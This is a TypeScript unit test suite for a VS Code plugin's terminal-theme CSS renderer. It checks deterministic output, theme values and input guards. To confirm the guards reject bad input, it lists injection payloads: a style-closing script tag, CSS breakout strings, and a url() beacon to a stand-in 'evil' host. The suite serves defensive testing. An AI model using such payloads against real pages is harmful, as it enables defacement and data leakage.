/**
 * Story E20260925edb76e2e:S001 / t3 — sc1 design-tokens unit suite.
 *
 * Pure generated-string assertions (no webview runtime), mirroring
 * vscode-plugin/src/panels/__tests__/webview-host.test.ts. Proves the
 * renderTerminalStyle postconditions, both guards, determinism, the light-theme
 * variant, surfaceClass totality, and the frozen terminalTheme values.
 *
 * Run: npx tsx --test vscode-plugin/src/chat/__tests__/design-tokens.test.ts
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  renderTerminalStyle,
  surfaceClass,
  terminalTheme,
  TerminalThemeError,
  SURFACE_KINDS,
  TERMINAL_SURFACE_CLASS,
  type TerminalTheme,
} from '../design-tokens.js';

/** A light-theme variant (tui.css :root[data-theme=light] values) for the edge-case test. */
const LIGHT: TerminalTheme = {
  font: { mono: 'ui-monospace, "SF Mono", monospace', sizePx: 13, linePx: 20 },
  color: { bg: '#f3efe4', fg: '#3b3a34', dim: '#a49d89', accent: '#227a45', warn: '#9a6b00', err: '#b3402f', sel: 'rgba(34, 122, 69, 0.16)' },
  chrome: { border: '#d4ccb6', boxChars: { h: '─', v: '│', tl: '┌', tr: '┐', bl: '└', br: '┘' } },
  marker: { pending: '◆', toolCall: '▸', edit: '✎', done: '✓', error: '✗' },
};

test('renderTerminalStyle: opens/closes <style>, contains every token + var(--vscode-*,<fallback>), CSP-safe', () => {
  const css = renderTerminalStyle(terminalTheme);
  assert.ok(css.startsWith('<style>'), 'opens with <style>');
  assert.ok(css.endsWith('</style>'), 'closes with </style>');
  // The var(--vscode-*, <fallback>) layering is present.
  assert.match(css, /var\(--vscode-[a-zA-Z-]+, /, 'uses the var(--vscode-*, <fallback>) idiom');
  // Every color / chrome / marker / font token literal appears in the output.
  const c = terminalTheme.color;
  for (const val of [c.bg, c.fg, c.dim, c.accent, c.warn, c.err, c.sel, terminalTheme.chrome.border, terminalTheme.font.mono]) {
    assert.ok(css.includes(val), `output contains token value ${val}`);
  }
  for (const g of Object.values(terminalTheme.chrome.boxChars)) assert.ok(css.includes(g), `contains box char ${g}`);
  for (const g of Object.values(terminalTheme.marker)) assert.ok(css.includes(g), `contains marker glyph ${g}`);
  assert.ok(css.includes(`${terminalTheme.font.sizePx}px`) && css.includes(`${terminalTheme.font.linePx}px`), 'contains font sizes');
  // CSP-safe: no remote origins / asWebviewUri.
  assert.doesNotMatch(css, /asWebviewUri/);
  assert.doesNotMatch(css, /https?:\/\//);
});

test('renderTerminalStyle: deterministic (two calls byte-identical)', () => {
  assert.equal(renderTerminalStyle(terminalTheme), renderTerminalStyle(terminalTheme));
});

test('renderTerminalStyle: emits a rule for every SurfaceKind class', () => {
  const css = renderTerminalStyle(terminalTheme);
  for (const k of SURFACE_KINDS) {
    assert.ok(css.includes(`.${TERMINAL_SURFACE_CLASS[k]} {`), `emits a rule for ${TERMINAL_SURFACE_CLASS[k]}`);
  }
});

test('renderTerminalStyle: throws TerminalThemeError on an empty token, naming the path', () => {
  const bad: TerminalTheme = { ...terminalTheme, color: { ...terminalTheme.color, accent: '   ' } };
  assert.throws(() => renderTerminalStyle(bad), (e: unknown) => e instanceof TerminalThemeError && /color\.accent/.test((e as Error).message));
});

test('renderTerminalStyle: throws TerminalThemeError on a token with angle brackets (style-breaking)', () => {
  const bad: TerminalTheme = { ...terminalTheme, color: { ...terminalTheme.color, fg: '</style><script>' } };
  assert.throws(() => renderTerminalStyle(bad), (e: unknown) => e instanceof TerminalThemeError && /color\.fg/.test((e as Error).message));
});

// The guard must reject CSS-breakout payloads that use NO angle brackets — a `)`,
// `;`, `}`, or `"` in a raw-interpolated token would otherwise inject arbitrary CSS.
const COLOR_INJECTIONS: ReadonlyArray<readonly [string, string]> = [
  ['closes var() + rule', '#000); } body { display: none'],
  ['semicolon + selector', '#000; } .evil { color: red'],
  ['url() beacon', 'url(https://evil/?x=leak)'],
  ['double-quote break', '#000" '],
  ['brace break', '#000 }'],
];
for (const [label, payload] of COLOR_INJECTIONS) {
  test(`renderTerminalStyle: rejects color injection (${label}) with no angle brackets`, () => {
    const bad: TerminalTheme = { ...terminalTheme, color: { ...terminalTheme.color, bg: payload } };
    assert.throws(() => renderTerminalStyle(bad), (e: unknown) => e instanceof TerminalThemeError && /color\.bg/.test((e as Error).message));
    // And the injected selector never reaches any output (no half-built emit).
    assert.doesNotThrow(() => {
      try { renderTerminalStyle(bad); } catch { /* expected */ }
    });
  });
}

const GLYPH_INJECTIONS: ReadonlyArray<readonly [string, string]> = [
  ['quote + selector', '"; } .evil-injected { color: red } .z:before{content:"'],
  ['brace break', 'x } .evil {'],
  ['backslash escape', 'x\\'],
];
for (const [label, payload] of GLYPH_INJECTIONS) {
  test(`renderTerminalStyle: rejects marker-glyph injection (${label})`, () => {
    const bad: TerminalTheme = { ...terminalTheme, marker: { ...terminalTheme.marker, pending: payload } };
    assert.throws(() => renderTerminalStyle(bad), (e: unknown) => e instanceof TerminalThemeError && /marker\.pending/.test((e as Error).message));
  });
}

test('renderTerminalStyle: still accepts the legitimate quoted font stack + rgba/hex colors', () => {
  // Regression guard for the allowlist: the real default theme must pass.
  assert.doesNotThrow(() => renderTerminalStyle(terminalTheme));
  const css = renderTerminalStyle(terminalTheme);
  assert.ok(css.includes('"SF Mono"'), 'the quoted font stack survives validation');
  assert.ok(css.includes('rgba(74, 222, 128, 0.22)'), 'the rgba selection color survives validation');
});

test('renderTerminalStyle: light-theme variant renders a valid deterministic <style> with light values', () => {
  const css = renderTerminalStyle(LIGHT);
  assert.ok(css.startsWith('<style>') && css.endsWith('</style>'));
  assert.ok(css.includes('#f3efe4') && css.includes('#227a45'), 'carries the light palette');
  assert.equal(css, renderTerminalStyle(LIGHT), 'deterministic for the variant too');
});

test('surfaceClass: total over all five SurfaceKind members; each class appears in the rendered output', () => {
  const css = renderTerminalStyle(terminalTheme);
  for (const k of SURFACE_KINDS) {
    const cls = surfaceClass(k);
    assert.ok(typeof cls === 'string' && cls.length > 0, `surfaceClass(${k}) is non-empty`);
    assert.ok(css.includes(`.${cls} {`), `renderer emits a rule for ${cls}`);
  }
  assert.equal(SURFACE_KINDS.length, 5, 'exactly five surfaces');
});

test('terminalTheme: carries the tui.css values and is frozen', () => {
  assert.equal(terminalTheme.color.bg, '#0b0e14');
  assert.equal(terminalTheme.color.accent, '#4ade80');
  assert.equal(terminalTheme.color.warn, '#fbbf24');
  assert.equal(terminalTheme.color.err, '#f87171');
  assert.match(terminalTheme.font.mono, /monospace/);
  assert.ok(Object.isFrozen(terminalTheme), 'terminalTheme is frozen');
  assert.ok(Object.isFrozen(terminalTheme.color), 'nested color is frozen');
});
